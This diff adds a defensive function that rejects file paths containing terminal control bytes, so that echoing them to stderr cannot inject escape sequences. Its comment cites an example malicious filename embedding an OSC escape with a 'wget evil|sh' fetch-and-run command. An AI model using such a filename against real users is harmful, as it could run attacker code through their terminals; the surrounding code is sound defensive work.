@@ -58,3 +58,34 @@ fn kii_validate_color(color): i64 {
     if (color == 16) { return 1; }
     return 0;
 }
+
+# ANSI-injection defense for stderr path-echo. Returns 1 if `path`
+# contains any byte that must NOT be emitted verbatim to a terminal-
+# attached fd; 0 if the path is safe to echo. The rule is the
+# coreutils-`ls` shape: reject C0 controls (0x00–0x1F) except TAB
+# (0x09) and LF (0x0A), and reject DEL (0x7F). The C1 high-range
+# (0x80–0x9F) is NOT rejected because UTF-8 paths routinely include
+# those bytes as multi-byte-sequence continuations — AGNOS naming
+# (Hawaiian / Sanskrit / East-Asian) is load-bearing on UTF-8 path
+# components.
+#
+# Pure predicate (no I/O) so kii.tcyr can assert on it directly.
+# Caller in main.cyr (_eprint_path_safe) emits "<path containing
+# control bytes — suppressed>" instead of the path when this
+# returns 1. See docs/audit/2026-05-22-audit.md § Finding 6 for the
+# threat model: a malicious filename like
+# `/tmp/\x1b]2;wget evil|sh\x07.png` would otherwise propagate raw
+# to fd 2 and reach the user's terminal as an OSC injection
+# (CVE-2021-25743 analog; full corpus at audit doc § 3.4).
+fn kii_path_has_control_bytes(path): i64 {
+    var len = strlen(path);
+    var i = 0;
+    while (i < len) {
+        var b = load8(path + i);
+        if ((b < 0x20 && b != 0x09 && b != 0x0A) || b == 0x7F) {
+            return 1;
+        }
+        i = i + 1;
+    }
+    return 0;
+}
